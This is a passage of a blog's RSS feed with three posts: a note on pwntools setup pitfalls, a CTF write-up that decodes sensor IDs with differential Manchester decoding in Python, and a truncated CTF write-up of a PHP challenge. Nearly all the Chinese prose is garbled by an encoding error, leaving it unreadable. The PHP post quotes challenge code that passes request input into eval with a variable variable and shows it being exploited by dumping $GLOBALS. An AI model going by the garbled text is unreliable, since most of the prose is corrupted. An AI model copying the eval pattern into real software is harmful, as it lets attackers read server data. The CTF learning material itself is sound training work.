			<content type="html"><![CDATA[<p>çº¯pwnå°ç™½åœ¨ç–«æƒ…æœŸé—´æ— èŠï¼Œäºæ˜¯å¼€å§‹ç©èµ·äº†pwnã€‚æœŸé—´åœ¨iæ˜¥ç§‹,freebufï¼ŒçŸ¥ä¹ä¸Šéšä¾¿çœ‹äº†å‡ ç¯‡å…¥é—¨æ‰‹å†Œï¼Œéš¾å—çš„æ˜¯æŠ€æœ¯æ´»ä»€ä¹ˆéƒ½çœ‹ä¸æ‡‚ã€‚ã€‚è·ç¦»ä¸Šæ¬¡æ¥è§¦æ±‡ç¼–æ˜¯å¤§ä¸€ä¸‹å­¦æœŸå§ï¼Œå½“æ—¶è®¡ç®—æœºç³»ç»Ÿçš„å®è·µè¯¾ç¨‹è¦æ±‚åšæŸå¸¸é’è—¤çš„bomblab,å½“æ—¶è·Ÿç€å¤§ä½¬çš„æ­¥éª¤å‹‰å¼ºå®Œæˆä¸‰å…³ã€‚æ¢ç´¢çš„è¿‡ç¨‹å¾ˆç´¯ï¼Œå°¤å…¶æ˜¯åœ¨æ±‡ç¼–çŸ¥è¯†è¿˜æ²¡æ¶ˆåŒ–å®Œï¼Œå°±å»åšret2somefuncçš„é¢˜ï¼Œä¸€ä¸ªå­—ï¼šéš¾ï¼Œä¸¤ä¸ªå­—ï¼šéš¾é¡¶ã€‚</p>
<p>åºŸè¯ä¸å¤šè¯´ï¼Œä¸‹é¢è®°å½•é…pwntoolsç¯å¢ƒè¸©çš„å‘ã€‚å½“ç„¶è¸©å‘è¿˜æ˜¯å› ä¸ºæ²¡æœ‰å…ˆå¥½å¥½è¯»å®˜æ–¹æ–‡æ¡£ã€‚</p>
<h2 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h2>
<p>pwntools(v2.0)æ˜¯ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬çš„pythonåº“ï¼Œè®¾è®¡è€…å°†å®ƒåˆ†ä¸ºä¸¤ä¸ªæ¨¡å—ï¼špwnlibä¸pwnã€‚ pwnlibæ˜¯ä¸ªå¹²å‡€çš„æ¨¡å—ï¼Œé€‚åˆåˆå­¦è€…å¿«é€Ÿå…¥é—¨ã€‚è€Œpwnæ˜¯æ‰“CTFä¸“ç”¨çš„å·¥å…·ç®±ï¼Œæ˜¯pwnlibçš„è¶…é›†ï¼ŒåŠŸèƒ½æ›´å¤šï¼Œä¹Ÿæ›´éš¾å…¥é—¨ã€‚å…·ä½“ä»‹ç»è¯·çœ‹<a href="http://docs.pwntools.com/en/stable/about.html">pwntoolsæ–‡æ¡£</a>ã€‚</p>
<h2 id="0x01">0x01</h2>
<p><strong>pwntoolsä¸é€‚é…windowsä¸­çš„python</strong>ã€‚
æˆ‘å…ˆå°è¯•åœ¨windowsç¯å¢ƒä¸‹pip install pwnã€‚å¾ˆå¿«å°±è£…å¥½äº†ï¼Œæœ¬ä»¥ä¸ºç›´æ¥è¿è¡Œpythonè„šæœ¬å°±å¤§åŠŸå‘Šæˆäº†ï¼Œç»“æœç¼–è¯‘å™¨å‘Šè¯‰æˆ‘ï¼š</p>
<p><img src="/img/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/1.JPG" alt="figure1">
è¡Œå§ï¼Œç¼ºä¸œè¥¿ï¼Œå’±ç”¨pipè¡¥ä¸Šï¼Œä½†æ˜¯å‘ç°_cursesä»…æ”¯æŒlinuxï¼Œå·§çš„æ˜¯åœ¨winå¹³å°ä¸Šæœ‰å¯¹åº”è½®å­ã€‚ç„¶åè¿˜æ˜¯ä¼šæœ‰é—®é¢˜ï¼Œå°±å¼€å§‹æ— é™æ‰“è¡¥ä¸ã€‚ã€‚å½“ç„¶æœ€åè„‘å­æ²¡æŠ½åˆ°åº•ï¼Œæ¢åˆ°äº†<strong>linux</strong>å†…,è¿™é‡Œæ¨èubuntu linux 64ã€‚</p>
<h2 id="0x02">0x02</h2>
<p><strong>è¦æƒ³æ–¹ä¾¿æµç•…å†™expï¼Œæœ€å¥½è£…åœ¨python2å†…</strong>ã€‚
ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºä»python3å¼€å§‹ï¼Œstrå’Œbytesçš„è¾¹ç•Œä¸å†æ¨¡ç³Šã€‚python2ä¸­ str+bytesèƒ½åˆå¹¶æˆbytesï¼Œé»˜è®¤å°†strä»¥asciiç¼–ç è§£ç ï¼Œè€Œpython3ä¸­ï¼Œé™¤éåŠ æ³•é‡å®šå‘ï¼Œå¦åˆ™æ— æ³•åˆå¹¶æˆç»Ÿä¸€æ ¼å¼ã€‚æ‰€ä»¥åœ¨python3ä¸­è¦æƒ³åˆå¹¶strå’Œbytesã€‚åªèƒ½<code>str.encode('ascii')+bytes</code>æˆ–è€…<code>str.encode+bytes.decode('ascii')</code></p>
<h2 id="0x03">0x03</h2>
<p><strong>pwntoolsä¸é€‚åˆè£…åœ¨32ä½ç³»ç»Ÿä¸­</strong>
è¯¥å‘æ˜¯æˆ‘åœ¨ubuntu 32å®‰è£…pwntoolsé‡åˆ°çš„ï¼Œæ‰§è¡Œexpä¼šæœ‰è­¦å‘Šï¼Œpwntoolsä»ç„¶ä¼šèµ·ä½œç”¨ï¼Œä½†æ˜¯å…·ä½“ä¼šäº§ç”Ÿä»€ä¹ˆå½±å“æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œå› ä¸ºå½“æ—¶è¿˜åœ¨å†™æœ€ç®€å•çš„exp, æ ˆæº¢å‡ºæ”»å‡»ï¼Œret2shellcodeæ”»å‡»ã€‚</p>
<p>å¦å¤–ï¼ŒpwntoolsçœŸçš„æ˜¯éå¸¸å¥½çš„å·¥å…·ï¼Œæ¥å£å¾ˆé½å…¨ï¼Œè°ç”¨è°çŸ¥é“ã€‚</p>
<p>å®Œã€‚</p>
]]></content>
		</item>
		
		<item>
			<title>ctfæ°´é¢˜---ä¼ æ„Ÿå™¨</title>
			<link>https://shankisme.com/posts/%E4%BC%A0%E6%84%9F%E5%99%A8/</link>
			<pubDate>Fri, 21 Feb 2020 01:07:00 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E4%BC%A0%E6%84%9F%E5%99%A8/</guid>
			<description>æœ¬ç€å…¥é—¨çš„æƒ³æ³•ï¼Œåœ¨writeupçš„å¸®åŠ©ä¸‹ï¼Œè¯•åšäººç”Ÿä¸­ç¬¬ä¸€é“CTFèµ›é¢˜, æœ¬æ–‡ç›®çš„æ˜¯è¿˜åŸè„±ç¦»wpçš„å†™é¢˜æ€è·¯ã€‚
é¢˜ç›®å‡ºè‡ª iæ˜¥ç§‹CTFå¤§æœ¬è¥: 2017å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›
å·²çŸ¥ Aä¼ æ„Ÿå™¨çš„IDå’Œå®ƒçš„è¾“å‡ºï¼Œ ä»¥åŠBçš„è¾“å‡ºã€‚ æ±‚å¦ä¸€ä¸ªä¼ æ„Ÿå™¨Bçš„IDã€‚
å¤§è‡´æ€è·¯æ˜¯ä»è¾“å‡ºä¸­å¯»æ‰¾è¾“å‡ºå’ŒIDçš„è”ç³»ï¼Œè€ŒAçš„IDå’Œè¾“å‡ºå°±æ˜¯çº¿ç´¢ã€‚
å‘ç°è¾“å‡ºæ˜¯16è¿›åˆ¶ï¼Œé‡åˆ°è¿›åˆ¶é—®é¢˜é¦–å…ˆåšçš„è‚¯å®šæ˜¯æ¯”å¯¹è¿›åˆ¶è½¬æ¢åçš„æ•°å­—ã€‚
å…ˆç”¨åœ¨çº¿å·¥å…·è½¬æ¢ä¸€ä¸‹Açš„è¾“å‡º å‘ç°æœ€æœ‰è§„å¾‹çš„æ˜¯2è¿›åˆ¶å’Œ8è¿›åˆ¶æ•°æ® ä½†æ˜¯è€ƒè™‘åˆ°8è¿›åˆ¶ä¸å¸¸ç”¨ï¼Œå¹¶ä¸”å®ƒçš„è§„å¾‹é›†ä¸­åœ¨52ä¸Šï¼Œæ²¡æ³•åˆ©ç”¨ æ‰€ä»¥æ¥ä¸‹æ¥çœ‹2è¿›åˆ¶ï¼š 2è¿›åˆ¶æ•°æ®é™¤äº†å‰5ä¸ª1ï¼Œåé¢çš„æ•°æ®éƒ½ä»¥äºŒè¿›åˆ¶å¯¹01ï¼Œ10çš„å½¢å¼åœ¨åšæ’åˆ—ç»„åˆ æˆ‘ä»¬éœ€è¦çš„æ˜¯æœ‰è§„å¾‹çš„æ•°ï¼Œ æ‰€ä»¥å¯ä»¥èˆå¼ƒæ‰è¾“å‡ºä¸­çš„å‰ä¸¤ä½(3E , 5ä¸ª1åŒ…å«åœ¨å…¶ä¸­) ç»§ç»­è§‚å¯Ÿä½™ä¸‹çš„äºŒè¿›åˆ¶æ•° å‘ç°å¾ˆåƒæ•°å­—é€»è¾‘ä¸­çš„ç”µå¹³è·³å˜ï¼Œ0ä»£è¡¨ä½ä½ï¼Œ1ä»£è¡¨é«˜ä½ è¯¥äºŒè¿›åˆ¶æ•°æ®å¯èƒ½æ˜¯åœ¨ä¼ è¾“æ•°æ®ã€‚ä½†æ˜¯æ²¡æœ‰è¿ç»­çš„0å’Œ1ï¼Œå› æ­¤è¯¥æ•°æ®å¾ˆæœ‰å¯èƒ½ç»è¿‡ç¼–ç  æŸ¥æ‰¾å„ç¼–ç å½¢å¼åå‘ç°åªæœ‰æ›¼åˆ‡æ–¯ç‰¹ç¼–ç å’Œå·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ç¼–ç ç¬¦åˆè¿™ä¸ªè§„å¾‹
æ›¼åˆ‡æ–¯ç‰¹ç¼–ç ï¼š dataç”¨è·³å˜è¡¨ç¤ºï¼Œ0å’Œ1å¯¹åº”01å’Œ10 è‡³äºè°å¯¹åº”è°æœ‰ä¸¤ç§æ ‡å‡†ï¼š å·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ç¼–ç ï¼š æ•°å­—ä¿¡å·å¯¹åº”ç”µå¹³è·³å˜ï¼Œå­˜åœ¨åˆå§‹ç”µå¹³è·³å˜cc=01, å½“å‰çš„ä¿¡å·ä¸º0æ„å‘³ç€å½“å‰è·³å˜å’Œä¸Šä¸€ä¸ªè·³å˜ç›¸åŒï¼Œä¸º1æ„å‘³ç€å½“å‰è·³å˜å’Œå‰ä¸€ä¸ªè·³å˜ä¸åŒã€‚ çŸ¥è¯†å›é¡¾çš„å·®ä¸å¤šäº†ï¼Œå›åˆ°é¢˜ç›®ï¼Œå¼€å§‹æ’¸ä»£ç  ç”±äºæ¶‰åŠåˆ°å„ç§è¿›åˆ¶è½¬æ¢å’Œåˆ’åˆ†ï¼Œc++å’Œjavaè¿‡äºåäººç±»ï¼Œå•¥éƒ½è¦è‡ªå·±å†™ï¼Œä¸å¦‚ç”¨python,pythonå¾ˆå¤šå†…åµŒæ–¹æ³•å°±èƒ½è¿›è¡Œè¿›åˆ¶è½¬æ¢å’Œåˆ’åˆ†äº†ã€‚ æ€è·¯å¾ˆç®€å• ç›´æ¥è´´ä»£ç ï¼š
import re def bintohex(s1): s = re.findall(&amp;#39;.{4}&amp;#39;, s1) s2 = &amp;#39;&amp;#39; for i in s: s2 += str(hex(int(i, 2))).replace(&amp;#39;0x&amp;#39;,&amp;#39;&amp;#39;) return s2 def diffmqst(s1): #å·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ pre = &amp;#39;01&amp;#39; rst = &amp;#39;&amp;#39; s = re.findall(&amp;#39;.{2}&amp;#39;,s1) for i in s: if i==pre: rst += &amp;#39;0&amp;#39; else : rst+=&amp;#39;1&amp;#39; pre = i return rst if __name__ == &amp;#39;__main__&amp;#39;: hex1 = &amp;#39;AAAAA56A69AA55A95995A569AA95565556&amp;#39; hex2 = &amp;#39;0x8893CA58&amp;#39; bin1 = bin(int(hex1, 16)).</description>
			<content type="html"><![CDATA[<p>æœ¬ç€å…¥é—¨çš„æƒ³æ³•ï¼Œåœ¨writeupçš„å¸®åŠ©ä¸‹ï¼Œè¯•åšäººç”Ÿä¸­ç¬¬ä¸€é“CTFèµ›é¢˜, æœ¬æ–‡ç›®çš„æ˜¯è¿˜åŸè„±ç¦»wpçš„å†™é¢˜æ€è·¯ã€‚</p>
<p><img src="/img/sensor/1.jpg" alt="ä¼ æ„Ÿå™¨1">
é¢˜ç›®å‡ºè‡ª <a href="https://www.ichunqiu.com/battalion?t=1&amp;r=58837">iæ˜¥ç§‹CTFå¤§æœ¬è¥: 2017å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›</a></p>
<p>å·²çŸ¥ Aä¼ æ„Ÿå™¨çš„IDå’Œå®ƒçš„è¾“å‡ºï¼Œ ä»¥åŠBçš„è¾“å‡ºã€‚
æ±‚å¦ä¸€ä¸ªä¼ æ„Ÿå™¨Bçš„IDã€‚</p>
<p>å¤§è‡´æ€è·¯æ˜¯ä»è¾“å‡ºä¸­å¯»æ‰¾è¾“å‡ºå’ŒIDçš„è”ç³»ï¼Œè€ŒAçš„IDå’Œè¾“å‡ºå°±æ˜¯çº¿ç´¢ã€‚</p>
<p>å‘ç°è¾“å‡ºæ˜¯16è¿›åˆ¶ï¼Œé‡åˆ°è¿›åˆ¶é—®é¢˜é¦–å…ˆåšçš„è‚¯å®šæ˜¯æ¯”å¯¹è¿›åˆ¶è½¬æ¢åçš„æ•°å­—ã€‚</p>
<p>å…ˆç”¨åœ¨çº¿å·¥å…·è½¬æ¢ä¸€ä¸‹Açš„è¾“å‡º
<img src="/img/sensor/2.jpg" alt="ä¼ æ„Ÿå™¨1"></p>
<p>å‘ç°æœ€æœ‰è§„å¾‹çš„æ˜¯2è¿›åˆ¶å’Œ8è¿›åˆ¶æ•°æ®
ä½†æ˜¯è€ƒè™‘åˆ°8è¿›åˆ¶ä¸å¸¸ç”¨ï¼Œå¹¶ä¸”å®ƒçš„è§„å¾‹é›†ä¸­åœ¨52ä¸Šï¼Œæ²¡æ³•åˆ©ç”¨
æ‰€ä»¥æ¥ä¸‹æ¥çœ‹2è¿›åˆ¶ï¼š
2è¿›åˆ¶æ•°æ®é™¤äº†å‰5ä¸ª1ï¼Œåé¢çš„æ•°æ®éƒ½ä»¥äºŒè¿›åˆ¶å¯¹01ï¼Œ10çš„å½¢å¼åœ¨åšæ’åˆ—ç»„åˆ
æˆ‘ä»¬éœ€è¦çš„æ˜¯æœ‰è§„å¾‹çš„æ•°ï¼Œ
æ‰€ä»¥å¯ä»¥èˆå¼ƒæ‰è¾“å‡ºä¸­çš„å‰ä¸¤ä½(3E , 5ä¸ª1åŒ…å«åœ¨å…¶ä¸­)
ç»§ç»­è§‚å¯Ÿä½™ä¸‹çš„äºŒè¿›åˆ¶æ•°
å‘ç°å¾ˆåƒæ•°å­—é€»è¾‘ä¸­çš„ç”µå¹³è·³å˜ï¼Œ0ä»£è¡¨ä½ä½ï¼Œ1ä»£è¡¨é«˜ä½
è¯¥äºŒè¿›åˆ¶æ•°æ®å¯èƒ½æ˜¯åœ¨ä¼ è¾“æ•°æ®ã€‚ä½†æ˜¯æ²¡æœ‰è¿ç»­çš„0å’Œ1ï¼Œå› æ­¤è¯¥æ•°æ®å¾ˆæœ‰å¯èƒ½ç»è¿‡ç¼–ç 
æŸ¥æ‰¾å„ç¼–ç å½¢å¼åå‘ç°åªæœ‰æ›¼åˆ‡æ–¯ç‰¹ç¼–ç å’Œå·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ç¼–ç ç¬¦åˆè¿™ä¸ªè§„å¾‹</p>
<h2 id="æ›¼åˆ‡æ–¯ç‰¹ç¼–ç ">æ›¼åˆ‡æ–¯ç‰¹ç¼–ç ï¼š</h2>
<p>dataç”¨è·³å˜è¡¨ç¤ºï¼Œ0å’Œ1å¯¹åº”01å’Œ10
è‡³äºè°å¯¹åº”è°æœ‰ä¸¤ç§æ ‡å‡†ï¼š
<img src="/img/sensor/3.png" alt="ä¼ æ„Ÿå™¨1"></p>
<h2 id="å·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ç¼–ç ">å·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ç¼–ç ï¼š</h2>
<p>æ•°å­—ä¿¡å·å¯¹åº”ç”µå¹³è·³å˜ï¼Œå­˜åœ¨åˆå§‹ç”µå¹³è·³å˜cc=01, å½“å‰çš„ä¿¡å·ä¸º0æ„å‘³ç€å½“å‰è·³å˜å’Œä¸Šä¸€ä¸ªè·³å˜ç›¸åŒï¼Œä¸º1æ„å‘³ç€å½“å‰è·³å˜å’Œå‰ä¸€ä¸ªè·³å˜ä¸åŒã€‚
<img src="/img/sensor/4.jpg" alt="ä¼ æ„Ÿå™¨1"></p>
<p>çŸ¥è¯†å›é¡¾çš„å·®ä¸å¤šäº†ï¼Œå›åˆ°é¢˜ç›®ï¼Œå¼€å§‹æ’¸ä»£ç 
ç”±äºæ¶‰åŠåˆ°å„ç§è¿›åˆ¶è½¬æ¢å’Œåˆ’åˆ†ï¼Œc++å’Œjavaè¿‡äºåäººç±»ï¼Œå•¥éƒ½è¦è‡ªå·±å†™ï¼Œä¸å¦‚ç”¨python,pythonå¾ˆå¤šå†…åµŒæ–¹æ³•å°±èƒ½è¿›è¡Œè¿›åˆ¶è½¬æ¢å’Œåˆ’åˆ†äº†ã€‚
æ€è·¯å¾ˆç®€å• ç›´æ¥è´´ä»£ç ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>
<span class="k">def</span> <span class="nf">bintohex</span><span class="p">(</span><span class="n">s1</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.</span><span class="si">{4}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
    <span class="n">s2</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="n">s2</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">2</span><span class="p">)))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">s2</span>

<span class="k">def</span> <span class="nf">diffmqst</span><span class="p">(</span><span class="n">s1</span><span class="p">):</span> <span class="c1">#å·®åˆ†æ›¼åˆ‡æ–¯ç‰¹</span>
    <span class="n">pre</span> <span class="o">=</span> <span class="s1">&#39;01&#39;</span>
    <span class="n">rst</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.</span><span class="si">{2}</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">s1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="n">pre</span><span class="p">:</span>
            <span class="n">rst</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span>
        <span class="k">else</span> <span class="p">:</span> <span class="n">rst</span><span class="o">+=</span><span class="s1">&#39;1&#39;</span>
        <span class="n">pre</span> <span class="o">=</span> <span class="n">i</span>
    <span class="k">return</span> <span class="n">rst</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">hex1</span> <span class="o">=</span> <span class="s1">&#39;AAAAA56A69AA55A95995A569AA95565556&#39;</span>
    <span class="n">hex2</span> <span class="o">=</span> <span class="s1">&#39;0x8893CA58&#39;</span>
    <span class="n">bin1</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">hex1</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">bin2</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.</span><span class="si">{4}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">hex1</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
    <span class="n">dict1</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;0101&#39;</span><span class="p">:</span> <span class="s1">&#39;11&#39;</span><span class="p">,</span> <span class="s1">&#39;1010&#39;</span><span class="p">:</span><span class="s1">&#39;00&#39;</span><span class="p">,</span> <span class="s1">&#39;1001&#39;</span><span class="p">:</span><span class="s1">&#39;01&#39;</span><span class="p">,</span> <span class="s1">&#39;0110&#39;</span><span class="p">:</span> <span class="s1">&#39;10&#39;</span><span class="p">}</span> <span class="c1">#æ›¼åˆ‡æ–¯ç‰¹ç¼–ç 1 Thomas</span>
    <span class="n">dict2</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;0101&#39;</span><span class="p">:</span> <span class="s1">&#39;00&#39;</span><span class="p">,</span> <span class="s1">&#39;1010&#39;</span><span class="p">:</span><span class="s1">&#39;11&#39;</span><span class="p">,</span> <span class="s1">&#39;1001&#39;</span><span class="p">:</span><span class="s1">&#39;10&#39;</span><span class="p">,</span> <span class="s1">&#39;0110&#39;</span><span class="p">:</span> <span class="s1">&#39;01&#39;</span><span class="p">}</span> <span class="c1">#æ›¼åˆ‡æ–¯ç‰¹ç¼–ç 2 IEEE802.3</span>
    <span class="n">m1</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dict1</span><span class="p">[</span><span class="n">_</span><span class="p">]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">bin2</span><span class="p">)</span>
    <span class="n">m2</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dict2</span><span class="p">[</span><span class="n">_</span><span class="p">]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">bin2</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æ›¼åˆ‡æ–¯ç‰¹ç¼–ç 1 id1: &#34;</span><span class="p">,</span> <span class="n">bintohex</span><span class="p">(</span><span class="n">m1</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æ›¼åˆ‡æ–¯ç‰¹ç¼–ç 2 id2: &#34;</span><span class="p">,</span> <span class="n">bintohex</span><span class="p">(</span><span class="n">m2</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;å·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ç¼–ç  id3: &#34;</span><span class="p">,</span> <span class="n">bintohex</span><span class="p">(</span><span class="n">diffmqst</span><span class="p">(</span><span class="n">bin1</span><span class="p">)))</span>

</code></pre></div><p>è¾“å‡ºï¼š</p>
<pre tabindex="0"><code>æ›¼åˆ‡æ–¯ç‰¹ç¼–ç 1 id1:  003890f1d73907efe
æ›¼åˆ‡æ–¯ç‰¹ç¼–ç 2 id2:  ffc76f0e28c6f8101
å·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ç¼–ç  id3:  8024d8893ca584181
</code></pre><p>å‘ç°å·®åˆ†æ›¼åˆ‡æ–¯ç‰¹ä¸­åŒ…å«ä¼ æ„Ÿå™¨Açš„ID
æ²¿è¿™ä¸ªæ€è·¯ï¼Œ ä¸éš¾æ‰¾åˆ°ä¼ æ„Ÿå™¨Bçš„ID</p>
<p>flag=8845abf3</p>
]]></content>
		</item>
		
		<item>
			<title>ctfæ°´é¢˜---çˆ†ç ´</title>
			<link>https://shankisme.com/posts/%E7%88%86%E7%A0%B4/</link>
			<pubDate>Fri, 21 Feb 2020 01:07:00 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E7%88%86%E7%A0%B4/</guid>
			<description>å®è·µè¯æ˜ï¼Œæç¤ºä¹Ÿæœ‰ä¸å¯é çš„æ—¶å€™ï¼Œå‡ºé¢˜äººä¹Ÿä¼šé¸¡è´¼ã€‚ çˆ†ç ´ä¸€é¢˜ç›®åœ°å€ è¿™é“é¢˜æœ‰æ—¶é—´é™åˆ¶ï¼Œå¿…é¡»åœ¨ä¸€å°æ—¶å†…å®Œæˆï¼Œå¦åˆ™é¡µé¢ä¼šå¤±æ•ˆï¼Œè¯´ç™½äº†æ˜¯ä¸ºäº†æœç»ç­¾åˆ°é¢˜äº’ç›¸æŠ„è¢­hhhã€‚ è¿›å»åç»™çš„æ˜¯phpåç«¯æºç ã€‚
è¿™æ˜¯æœ¬èœé¸¡ç¬¬ä¸€æ¬¡æ¥è§¦æ‹é»„ç‰‡php, ä¼šäº†å‡ æ‹›åå‘ç°phpçš„è¯­æ³•ç®€ç›´åƒæ˜¯C+pythonçš„ç§ç”Ÿå­ï¼Œå¸¦åŸºå› ç¼ºé™·çš„é‚£ç§ã€‚å®ƒå¾ˆå¤šå‡½æ•°æ–¹æ³•éƒ½èƒ½è½»æ˜“åœ°è·å¾—æ–‡ä»¶åœ°æ‰€æœ‰ä¿¡æ¯ï¼Œè¿˜æœ‰å¤§å †åœ°å…¨å±€å˜é‡é­”æœ¯å˜é‡ï¼Œé…ä¸Ševal()æ–¹æ³•åœ°ç¼ºé™·ï¼Œç®€ç›´æ˜¯çˆ†ç ´å¯¹è±¡çš„ä¸Šä¸Šä¹‹é€‰å•Šã€‚ã€‚ åºŸè¯ä¸å¤šè¯´ï¼Œæ¥çœ‹çœ‹ä»£ç ï¼š
&amp;lt;?php include &amp;#34;flag.php&amp;#34;; $a = @$_REQUEST[&amp;#39;hello&amp;#39;]; if(!preg_match(&amp;#39;/^\w*$/&amp;#39;,$a )){ die(&amp;#39;ERROR&amp;#39;); } eval(&amp;#34;var_dump($$a);&amp;#34;); show_source(__FILE__); ?&amp;gt;@$_REQUEST[&amp;lsquo;hello&amp;rsquo;] æç¤ºæˆ‘ä»¬ä¸Šä¼ çš„å˜é‡åä¸ºhello
requestæ˜¯ä¸¤ç§æ•°æ®ä¸Šä¼ æ–¹å¼postå’Œgetçš„ç»Ÿç§° è¿™é‡Œå½“ç„¶é€‰æ›´æ–¹ä¾¿çš„get, ç›´æ¥åœ¨urlååŠ helloå˜é‡ ä¸‹é¢çš„åˆ¤æ–­è¯­å¥ä¸­çš„æ­£åˆ™æç¤ºæˆ‘ä»¬å˜é‡å¿…é¡»ä¸º[A-Za-z0-9_] ä»¥åŠ$$aå‘Šè¯‰å’±$açš„å€¼ä¸èƒ½ä¹±è¾“ï¼Œå€¼è¦ç¬¦åˆå˜é‡å‘½åè§„åˆ™ï¼šå¼€å¤´å­—æ¯ä¸‹åˆ’çº¿ï¼Œä¹‹ååªèƒ½å­—æ¯ä¸‹åˆ’çº¿æˆ–æ•°å­—ã€‚ ç»§ç»­å¾€ä¸‹çœ‹, å°±å‘ç°ç¥åœ£çš„é€‰æ‹©å¼€å§‹äº†ï¼š
1ï¼šåˆ©ç”¨var_dump()è¾“å‡ºå˜é‡å†…å®¹ï¼Œå‰ææ˜¯å¾—çŸ¥é“æœ‰ä¸ªå˜é‡åæ˜¯è¾“å…¥çš„å€¼ã€‚å…¶å®ä¸å¯èƒ½ç»™ä½ çŒœçš„ï¼Œè¿™ç§æƒ…å†µä¸‹åªèƒ½å…¨å±€å˜é‡æˆ–é­”æœ¯å˜é‡ã€‚ä¿é™©èµ·è§ï¼Œé€‰ä¸ªè¶…é›†ï¼š$GLOABALS
2: ç±»ä¼¼sqlæ³¨å…¥ï¼Œç»•å¼€var_dump()ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™è¦æ±‚å’±è¾“å…¥çš„å‘½ä»¤åŒ…æ‹¬â€œflag.phpâ€ï¼Œä½†æ˜¯æ­£åˆ™ä¸å…è®¸å–ï¼Œè¯¥æ€è·¯å¤±è´¥ã€‚ æœ€åæŒ‰ç…§1æ€è·¯ï¼Œç›´æ¥æŠŠinclude&amp;quot;flag.php&amp;quot;åçš„å…¨å±€å˜é‡å…¨æ‰“å°å‡ºæ¥äº†ã€‚ å‘ç°flagåœ¨ä¸€ä¸ªå…­ä½çš„å…¨å±€å˜é‡é‡Œã€‚
åšåˆ°è¿™é‡Œå†çœ‹æç¤ºï¼Œè¯´çœŸçš„ï¼Œåº”è¯¥åªæœ‰é«˜æ‰‹å’Œåšå®Œçš„äººèƒ½æ¨å‡ºå…¶ä¸­æ„æ€ï¼Œæˆ‘è¿™æ ·çš„èœé¸¡å¾ˆæœ‰å¯èƒ½å»çŒœæ–‡ä»¶é‡Œçš„å…­ä½å˜é‡å€¼ã€‚
åé¢é™†ç»­æŠŠçˆ†ç ´äºŒï¼Œçˆ†ç ´ä¸‰åšæ‰äº†ï¼ˆå·å·å‚è€ƒäº†ä¸‹WP å˜¿å˜¿ï¼‰
